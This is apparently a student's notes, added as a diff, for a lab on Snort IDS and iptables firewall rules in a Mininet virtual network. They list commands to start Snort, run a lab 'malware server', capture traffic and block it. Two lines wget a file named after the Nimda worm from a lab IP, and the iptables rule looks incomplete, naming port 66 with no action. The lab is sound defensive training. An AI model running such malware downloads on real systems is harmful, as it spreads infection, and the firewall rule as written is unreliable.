@@ -1,0 +1,49 @@
+Snort and firewall rules
+
+1 prepare the virtual enviroment
+command
+- sudo ./lab.support.files/scripts/configure_as_dhcp.sh 
+- ifconfig
+- ping www.cisco.com
+
+2 firewall and ids logs
+commands
+-sudo ./lab.support.files/scripts/cyberops_extended_topo_no_fw.py
+- mininet> xterm R1
+A node R1 command prompt will open 
+by  using command
+- lab.support.files/scripts/start_snort.sh
+- mininet> xterm H5
+- mininet> xterm H10
+A node H10 command prompt will open 
+- lab.support.files/scripts/mal_server_start.sh
+- netstat -tunap
+- mininet> xterm R1
+A node R1 command prompt will open 
+- tail -f /var/log/snort/alert
+- mininet> xterm H5
+A node H5 command prompt will open
+- wget 209.165.202.133:6666/w32.Nimda.Amm.exe
+- tcpdump -i H5-eth0 -w nimda.downaload.pcap &
+- fg
+- ls -l
+- mininet> xterm R1
+A node R1 command prompt will open
+- iptables -L -v
+- iptables -I FORWARD -p tcp -d 209.165.202.133 --dport 66
+- iptables -L -v
+- mininet> xterm H5
+A node H5 command prompt will open
+- wget 209.165.202.133:6666/w32.Nimda.Amm.exe
+
+
+
+
+
+
+
+
+
+
+ 
+
